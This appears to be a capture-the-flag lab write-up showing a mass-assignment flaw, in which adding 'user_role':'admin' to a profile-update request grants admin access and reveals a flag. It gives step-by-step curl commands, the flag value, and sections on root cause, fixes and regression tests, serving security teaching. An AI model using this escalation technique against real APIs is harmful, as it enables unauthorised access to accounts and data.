# Herra — Mass assignment on profile update → `/api/admin/flag`

**Target:** Voorivex lab (`tvoyxpr7wt.voorivex-lab.online`)  
**Category:** API Security  
**Date:** 2026-07-11

## Summary

After enumerating `/docs` (Swagger UI), the API map shows auth and user routes. Registration does not grant admin, but `PUT /api/user/edit` binds all JSON fields into the user model. Injecting `"user_role":"admin"` escalates privileges, unlocking `GET /api/admin/flag`.

## Reproduction

1. Discover API surface via Swagger:

```bash
BASE="https://tvoyxpr7wt.voorivex-lab.online"
curl -s "$BASE/docs/swagger-ui-init.js"   # embedded OpenAPI spec
```

2. Register and login (JWT auth):

```bash
USER="attacker$(date +%s)"
PASS="Password123!"

curl -s -X POST "$BASE/api/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USER\",\"password\":\"$PASS\",\"firstname\":\"Test\",\"lastname\":\"User\"}"

TOKEN=$(curl -s -X POST "$BASE/api/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" | jq -r .token)
```

3. Confirm default role:

```bash
curl -s "$BASE/api/user/me" -H "Authorization: Bearer $TOKEN"
```

Expected: `"user_role":"user"`

4. Escalate via profile update:

```bash
curl -s -X PUT "$BASE/api/user/edit" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_role":"admin"}'
```

5. Retrieve flag:

```bash
curl -s "$BASE/api/admin/flag" -H "Authorization: Bearer $TOKEN"
```

Expected:

```json
{"flag":"flag_d57ecbd4e0150359edd2506c84103b7d"}
```

## Field testing

| Injected field | Endpoint | Result |
|---|---|---|
| `user_role: "admin"` | `PUT /api/user/edit` | **Works** — flag endpoint returns 200 |
| `role: "admin"` | `PUT /api/user/edit` | Untested on Herra; use `user_role` |
| `user_role: "admin"` | `POST /api/auth/register` | Not required — signup assigns `user` by default |

Only `user_role` on the **update** endpoint matched the server-side model.

## Evidence

- Swagger documents `firstname`/`lastname` only on edit; server still accepts `user_role`.
- `GET /api/user/me` echoes `user_role` before and after edit — confirms persistence.
- Auth uses `Authorization: Bearer <JWT>`, not session cookies.
- Enumeration signal: wordlist hit on `/docs` (raft-small-directories-lowercase, first 500 lines).

## Root cause

Profile update handler performs unrestricted object binding / mass assignment. Client-supplied `user_role` overwrites the server default.

## Impact

Authenticated low-privilege user can self-escalate to admin and read the flag from `/api/admin/flag`.

## Fix

- Allowlist `PUT /api/user/edit` input to safe profile fields only.
- Set `user_role` server-side; reject unknown/privileged fields.
- Align Swagger schema with enforced server-side DTO.
- Enforce authorization on `/api/admin/flag` from non-client-writable attributes.

## Regression test

1. `PUT /api/user/edit` with `user_role: admin` must not persist admin.
2. New users must always receive default `user` role.
3. `/api/admin/flag` must return 403 for default-role JWTs.

## Flag

`flag_d57ecbd4e0150359edd2506c84103b7d`
